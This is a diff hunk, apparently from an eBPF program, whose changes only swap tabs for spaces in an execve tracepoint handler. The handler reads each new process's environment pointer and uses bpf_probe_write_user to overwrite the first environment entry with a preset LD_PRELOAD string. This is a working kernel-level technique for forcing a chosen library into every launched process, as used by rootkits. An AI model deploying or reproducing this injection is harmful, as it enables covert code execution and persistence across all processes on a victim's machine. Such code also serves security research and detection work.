@@ -332,17 +332,17 @@ const volatile char ld_preload[LD_PRELOAD_MAX_LEN];
 SEC("tracepoint/syscalls/sys_enter_execve")
 int tracepoint__syscalls__sys_enter_execve(struct trace_event_raw_sys_enter *ctx)
 {   
-	bpf_printk("FILENAME: %s", ctx->args[0]);
-	bpf_printk("ARGV: 0x%lx", ctx->args[1]);
-	bpf_printk("ENVP: 0x%lx", ctx->args[2]);
+    bpf_printk("FILENAME: %s", ctx->args[0]);
+    bpf_printk("ARGV: 0x%lx", ctx->args[1]);
+    bpf_printk("ENVP: 0x%lx", ctx->args[2]);
 
     char **envp_dbl_ptr = (char**)BPF_CORE_READ(ctx, args[2]); /* ctx->args[2] */
     char *envp_ptr = NULL;
 	
-	bpf_probe_read_user(&envp_ptr, sizeof(unsigned long), envp_dbl_ptr);
-	bpf_probe_write_user(envp_ptr, &ld_preload, sizeof(ld_preload));
+    bpf_probe_read_user(&envp_ptr, sizeof(unsigned long), envp_dbl_ptr);
+    bpf_probe_write_user(envp_ptr, &ld_preload, sizeof(ld_preload));
 
-	return 0;
+    return 0;
 }
 
 char _license[] SEC("license") = "GPL";
